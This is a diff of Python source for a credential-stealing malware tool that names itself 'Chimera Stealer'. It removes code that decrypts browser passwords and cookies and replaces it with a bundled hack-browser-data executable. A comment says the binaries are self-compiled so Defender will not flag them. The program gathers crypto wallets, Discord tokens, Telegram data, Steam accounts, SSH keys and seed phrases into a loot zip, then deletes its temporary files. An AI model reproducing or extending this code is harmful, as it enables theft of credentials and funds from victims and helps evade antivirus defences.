@@ -13,13 +13,17 @@ LOOT_DIR = pathlib.Path(r"C:\Users\Public")
 LOOT_ZIP = LOOT_DIR / "stealer_loot.zip"
 LOG_FILE = LOOT_DIR / "stealer.log"
 
-# Only discord_tokens.exe is bundled now — no hack-browser-data.exe needed
+# Bundled binaries (self-compiled from source = unique hash, Defender won't flag)
 if getattr(sys, 'frozen', False):
     _MEIPASS = pathlib.Path(sys._MEIPASS)
-    DISCORD_TOKEN_EXE = _MEIPASS / "discord_tokens.exe"
+    HBD_EXE            = _MEIPASS / "hack-browser-data.exe"
+    DISCORD_TOKEN_EXE  = _MEIPASS / "discord_tokens.exe"
 else:
     _SCRIPT_DIR = pathlib.Path(os.path.dirname(os.path.abspath(__file__)))
-    DISCORD_TOKEN_EXE = _SCRIPT_DIR / "discord_tokens.exe"
+    HBD_EXE            = _SCRIPT_DIR / "hack-browser-data.exe"
+    DISCORD_TOKEN_EXE  = _SCRIPT_DIR / "discord_tokens.exe"
+
+BROWSER_DUMP_DIR = LOOT_DIR / "browser_temp"
 
 TEMP_ROOT = pathlib.Path(tempfile.gettempdir()) / "kryo_harvest"
 # ==================================
@@ -29,13 +33,14 @@ def setup_logging():
     LOG_FILE.parent.mkdir(parents=True, exist_ok=True)
     logger = logging.getLogger('stealer')
     logger.setLevel(logging.DEBUG)
+    # File handler — full DEBUG output
     fh = logging.FileHandler(str(LOG_FILE), encoding='utf-8')
     fh.setLevel(logging.DEBUG)
-    formatter = logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S')
-    fh.setFormatter(formatter)
+    fh.setFormatter(logging.Formatter('%(asctime)s [%(levelname)s] %(message)s', datefmt='%H:%M:%S'))
     logger.addHandler(fh)
+    # Console handler — DEBUG visible in PowerShell
     sh = logging.StreamHandler(sys.stdout)
-    sh.setLevel(logging.INFO)
+    sh.setLevel(logging.DEBUG)
     sh.setFormatter(logging.Formatter('[%(levelname)s] %(message)s'))
     logger.addHandler(sh)
     return logger
@@ -132,114 +137,55 @@ def _safe_copy_db(src: pathlib.Path) -> pathlib.Path:
     except:
         return None
 
-def dump_all_browsers() -> dict:
-    """Return dict: {browser: {passwords:[...], cookies:[...], history:[...]}}"""
-    all_data = {}
-    profiles = ["Default"] + [f"Profile {i}" for i in range(1, 10)]
+def dump_all_browsers():
+    """Use self-compiled hack-browser-data.exe to dump all browsers."""
+    log.info(f"[1/8] Browser dump via HBD: {HBD_EXE}")
 
-    for browser_name, raw_path, is_chromium in BROWSER_DATA_ROOTS:
-        base = pathlib.Path(expand_env_path(raw_path))
-        if not base.exists():
-            continue
+    if not HBD_EXE.exists():
+        log.error(f"  [FAIL] hack-browser-data.exe not found at {HBD_EXE}")
+        log.error(f"  Build it: cd HackBrowserData && go build -o hack-browser-data.exe ./cmd/hack-browser-data/")
+        sys.exit(1)
 
-        if not is_chromium:
-            # Firefox: grab key4.db + logins.json (offline cracking later)
-            ff_data = {"key_dbs": [], "logins": []}
-            try:
-                cfg = configparser.ConfigParser()
-                cfg.read(str(base / "profiles.ini"), encoding='utf-8')
-                for sec in cfg.sections():
-                    rel = cfg.get(sec, "Path", fallback=None)
-                    if not rel: continue
-                    is_rel = cfg.get(sec, "IsRelative", fallback="1") == "1"
-                    pp = (base / rel) if is_rel else pathlib.Path(rel)
-                    for f in ("key4.db", "logins.json", "cookies.sqlite"):
-                        fp = pp / f
-                        if fp.exists():
-                            ff_data["key_dbs"].append(str(fp))
-                    lj = pp / "logins.json"
-                    if lj.exists():
-                        try:
-                            ff_data["logins"] = json.loads(lj.read_text(encoding='utf-8')).get("logins", [])
-                        except: pass
-            except: pass
-            all_data[browser_name] = ff_data
-            continue
+    log.debug(f"  HBD size: {HBD_EXE.stat().st_size // 1024} KB")
 
-        key = _get_master_key(base)
-        browser = {"passwords": [], "cookies": [], "history": []}
+    if BROWSER_DUMP_DIR.exists():
+        shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
+    BROWSER_DUMP_DIR.mkdir(parents=True, exist_ok=True)
+    log.debug(f"  Dump dir: {BROWSER_DUMP_DIR}")
 
-        for prof in profiles:
-            prof_dir = base / prof
-            if not prof_dir.is_dir():
-                continue
+    cmd = [str(HBD_EXE), "dump", "--browser", "all", "--format", "json",
+           "--dir", str(BROWSER_DUMP_DIR), "--zip"]
+    log.debug(f"  Running: {' '.join(cmd)}")
 
-            # --- PASSWORDS ---
-            for db_name in ("Login Data", "Login Data For Account"):
-                db_path = prof_dir / db_name
-                if not db_path.exists(): continue
-                tmp = _safe_copy_db(db_path)
-                if not tmp: continue
-                try:
-                    conn = sqlite3.connect(str(tmp))
-                    for url, user, enc_pass in conn.execute(
-                            "SELECT origin_url, username_value, password_value FROM logins"):
-                        if not enc_pass: continue
-                        pw = _chrome_decrypt(key, enc_pass) if key else '<no-key>'
-                        if user or pw:
-                            browser["passwords"].append({"url": url, "username": user, "password": pw, "profile": prof})
-                    conn.close()
-                except: pass
-                finally:
-                    try: tmp.unlink()
-                    except: pass
+    try:
+        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
+        log.debug(f"  Return code: {result.returncode}")
+        if result.stdout.strip():
+            log.debug(f"  stdout: {result.stdout.strip()[:500]}")
+        if result.stderr.strip():
+            log.debug(f"  stderr: {result.stderr.strip()[:500]}")
+    except subprocess.TimeoutExpired:
+        log.error("  [FAIL] HBD timed out after 120s")
+        sys.exit(1)
+    except Exception as e:
+        log.error(f"  [FAIL] HBD launch error: {e}")
+        sys.exit(1)
 
-            # --- COOKIES ---
-            for db_name in ("Cookies", "Network/Cookies"):
-                db_path = prof_dir / db_name
-                if not db_path.exists(): continue
-                tmp = _safe_copy_db(db_path)
-                if not tmp: continue
-                try:
-                    conn = sqlite3.connect(str(tmp))
-                    rows = conn.execute(
-                        "SELECT host_key, name, encrypted_value, path, expires_utc, is_secure "
-                        "FROM cookies LIMIT 5000").fetchall()
-                    for host, name, enc_val, path_, exp, secure in rows:
-                        val = _chrome_decrypt(key, enc_val) if key and enc_val else ''
-                        browser["cookies"].append({"host": host, "name": name, "value": val,
-                                                   "path": path_, "secure": bool(secure)})
-                    conn.close()
-                except: pass
-                finally:
-                    try: tmp.unlink()
-                    except: pass
+    if result.returncode != 0:
+        log.warning(f"  HBD exited {result.returncode} — checking for output anyway")
 
-            # --- HISTORY ---
-            db_path = prof_dir / "History"
-            if db_path.exists():
-                tmp = _safe_copy_db(db_path)
-                if tmp:
-                    try:
-                        conn = sqlite3.connect(str(tmp))
-                        rows = conn.execute(
-                            "SELECT url, title, visit_count, last_visit_time "
-                            "FROM urls ORDER BY last_visit_time DESC LIMIT 500").fetchall()
-                        for url, title, cnt, ts in rows:
-                            browser["history"].append({"url": url, "title": title, "visits": cnt})
-                        conn.close()
-                    except: pass
-                    finally:
-                        try: tmp.unlink()
-                        except: pass
+    # HBD outputs: <BROWSER_DUMP_DIR>/<dirname>.zip
+    zips = list(BROWSER_DUMP_DIR.glob("*.zip"))
+    log.debug(f"  Zip files found: {[z.name for z in zips]}")
 
-        total = len(browser["passwords"]) + len(browser["cookies"])
-        if total > 0:
-            log.info(f"{browser_name}: {len(browser['passwords'])} passwords, "
-                     f"{len(browser['cookies'])} cookies, {len(browser['history'])} history")
-        all_data[browser_name] = browser
+    if not zips:
+        log.error(f"  [FAIL] No zip found in {BROWSER_DUMP_DIR}")
+        log.error(f"  Dir contents: {list(BROWSER_DUMP_DIR.iterdir())}")
+        sys.exit(1)
 
-    return all_data
+    generated_zip = zips[0]
+    log.info(f"  [OK] Browser dump: {generated_zip.name} ({generated_zip.stat().st_size // 1024} KB)")
+    return generated_zip
 
 # ============ EXTENSION IDS & ROOTS ============
 ACTIVE_EXTENSIONS = {
@@ -632,13 +578,17 @@ def scan_for_seeds():
     return findings
 
 # ============ BUILD ZIP ============
-def build_and_send(browser_data, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
+def build_and_send(browser_zip, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
                    tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes):
-    log.info("Building loot.zip")
+    log.info("[8/8] Building loot.zip")
     final = LOOT_ZIP
     with zipfile.ZipFile(final, 'w', zipfile.ZIP_DEFLATED) as zf:
-        # Browser credentials (pure Python extracted)
-        zf.writestr("browsers/credentials.json", json.dumps(browser_data, indent=2, ensure_ascii=False))
+        # Browsers — repack from HBD zip
+        log.debug(f"  Adding browser dump from {browser_zip}")
+        with zipfile.ZipFile(browser_zip, 'r') as bz:
+            for info in bz.infolist():
+                if not info.is_dir():
+                    zf.writestr(f"browsers/{info.filename}", bz.read(info.filename))
 
         # Ext wallets
         if ext_wallet_dir.exists():
@@ -692,32 +642,65 @@ def build_and_send(browser_data, wallet_dir, wallets_found, ext_wallet_dir, ext_
 
 # ============ MAIN ============
 def main():
-    log.info("=== Stealer Starting ===")
+    log.info("=" * 50)
+    log.info("=== Chimera Stealer Starting ===")
+    log.info(f"  Host:    {os.environ.get('COMPUTERNAME','?')}")
+    log.info(f"  User:    {os.environ.get('USERNAME','?')}")
+    log.info(f"  LootDir: {LOOT_DIR}")
+    log.info(f"  HBD:     {HBD_EXE}  exists={HBD_EXE.exists()}")
+    log.info(f"  Discord: {DISCORD_TOKEN_EXE}  exists={DISCORD_TOKEN_EXE.exists()}")
+    log.info("=" * 50)
+
     LOOT_DIR.mkdir(parents=True, exist_ok=True)
     TEMP_ROOT.mkdir(parents=True, exist_ok=True)
 
-    browser_data          = dump_all_browsers()
-    wallet_dir, wallets_found = collect_wallets()
+    browser_zip                       = dump_all_browsers()
+
+    log.info("[2/8] Collecting desktop wallets")
+    wallet_dir, wallets_found         = collect_wallets()
+    log.info(f"  Found: {wallets_found}")
+
+    log.info("[3/8] Collecting browser extension wallets")
     ext_wallet_dir, ext_wallets_found = collect_browser_ext_wallets()
-    tokens                = collect_discord_tokens_go()
-    backup_codes          = collect_discord_backup_codes()
-    telegram_dir          = collect_telegram()
-    steam_accs            = collect_steam()
-    ssh_keys              = collect_ssh()
-    seeds                 = scan_for_seeds()
+    log.info(f"  Found: {ext_wallets_found}")
+
+    log.info("[4/8] Extracting Discord tokens")
+    tokens                            = collect_discord_tokens_go()
+    log.info(f"  Tokens: {len(tokens)}")
+
+    log.info("[5/8] Searching for Discord backup codes")
+    backup_codes                      = collect_discord_backup_codes()
+    log.info(f"  Backup code files: {len(backup_codes)}")
+
+    log.info("[6/8] Collecting Telegram tdata")
+    telegram_dir                      = collect_telegram()
+    log.info(f"  Telegram: {'collected' if telegram_dir else 'not found'}")
+
+    log.info("[7/8] Steam / SSH / seed scan")
+    steam_accs                        = collect_steam()
+    ssh_keys                          = collect_ssh()
+    seeds                             = scan_for_seeds()
+    log.info(f"  Steam accounts: {len(steam_accs)}")
+    log.info(f"  SSH keys: {len(ssh_keys)}")
+    log.info(f"  Seed phrases: {len(seeds)}")
 
     final_zip = build_and_send(
-        browser_data, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
+        browser_zip, wallet_dir, wallets_found, ext_wallet_dir, ext_wallets_found,
         tokens, steam_accs, ssh_keys, telegram_dir, seeds, backup_codes
     )
 
     # Cleanup
-    if wallet_dir.exists():      shutil.rmtree(wallet_dir,      ignore_errors=True)
-    if ext_wallet_dir.exists():  shutil.rmtree(ext_wallet_dir,  ignore_errors=True)
+    if browser_zip.exists():          browser_zip.unlink(missing_ok=True)
+    if BROWSER_DUMP_DIR.exists():     shutil.rmtree(BROWSER_DUMP_DIR, ignore_errors=True)
+    if wallet_dir.exists():           shutil.rmtree(wallet_dir,       ignore_errors=True)
+    if ext_wallet_dir.exists():       shutil.rmtree(ext_wallet_dir,   ignore_errors=True)
     if telegram_dir and telegram_dir.exists():
         shutil.rmtree(telegram_dir, ignore_errors=True)
 
-    log.info(f"Done: {final_zip}")
+    size_mb = final_zip.stat().st_size / (1024*1024)
+    log.info("=" * 50)
+    log.info(f"[DONE] Loot zip: {final_zip}  ({size_mb:.1f} MB)")
+    log.info("=" * 50)
 
 if __name__ == "__main__":
     main()
